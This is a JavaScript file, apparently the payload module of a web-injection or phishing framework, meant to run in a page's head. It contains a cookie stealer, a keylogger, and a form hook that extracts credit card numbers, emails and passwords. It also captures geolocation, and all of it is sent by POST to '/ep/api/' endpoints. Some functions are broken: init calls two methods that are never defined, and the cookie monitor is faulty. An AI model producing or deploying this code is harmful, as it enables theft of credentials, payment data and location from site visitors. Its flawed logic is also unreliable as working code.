/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

console.log('%c[✓] Payload initialized', 'color: #4CAF50');

const PayloadManager = {
    init: function() {
        this.initCookieStealer();
        this.initKeylogger();
        this.initFormStealer();
        this.initCreditCardDetector();
        this.initEmailDetector();
        this.initGeolocation();
        
        console.log('[PayloadManager] All payloads initialized');
    },

    initCookieStealer: function() {
        // Initial cookie capture
        this.captureCookies();
        
        // Monitor cookie changes
        document.cookie.split(';').forEach(cookie => {
            const [name] = cookie.trim().split('=');
            Object.defineProperty(document, 'cookie', {
                get: function() {
                    return cookie;
                },
                set: function(value) {
                    cookie = value;
                    this.captureCookies();
                }
            });
        });
    },

    captureCookies: function() {
        const cookies = document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            return {
                name: name,
                value: value,
                domain: window.location.hostname,
                path: '/'
            };
        });

        if (cookies.length > 0) {
            this.sendData('/ep/api/cookies', {
                cookies: cookies,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            });
        }
    },

    initKeylogger: function() {
        let buffer = '';
        let lastKeystroke = Date.now();

        document.addEventListener('keydown', (e) => {
            buffer += e.key;
            lastKeystroke = Date.now();

            // Send buffer every 10 keystrokes or after 2 seconds
            if (buffer.length >= 10 || Date.now() - lastKeystroke >= 2000) {
                this.sendData('/ep/api/keylogger', {
                    keys: buffer,
                    url: window.location.href
                });
                buffer = '';
            }
        });
    },

    initFormStealer: function() {
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                const formData = {};
                new FormData(form).forEach((value, key) => {
                    formData[key] = value;
                    
                    // Check for sensitive data
                    if (this.isCreditCard(value)) {
                        this.sendData('/ep/api/sensitive', {
                            type: 'credit_card',
                            value: value,
                            url: window.location.href
                        });
                    } else if (this.isEmail(value)) {
                        this.sendData('/ep/api/sensitive', {
                            type: 'email',
                            value: value,
                            url: window.location.href
                        });
                    } else if (key.toLowerCase().includes('password')) {
                        this.sendData('/ep/api/sensitive', {
                            type: 'password',
                            value: value,
                            url: window.location.href
                        });
                    }
                });
            });
        });
    },

    initGeolocation: function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    this.sendData('/ep/api/geolocation', {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        url: window.location.href,
                        timestamp: new Date().toISOString(),
                        source: 'browser'
                    });
                },
                (error) => console.log('[Geolocation] Error:', error)
            );
        }
    },

    sendData: function(endpoint, data) {
        fetch(endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        }).catch(console.error);
    },

    isCreditCard: function(str) {
        const ccRegex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$/;
        return ccRegex.test(str.replace(/\s/g, ''));
    },

    isEmail: function(str) {
        const emailRegex = /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/;
        return emailRegex.test(str);
    }
};

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => PayloadManager.init());
} else {
    PayloadManager.init();
}

// Notify that payload is loaded
console.log('Payload initialized successfully');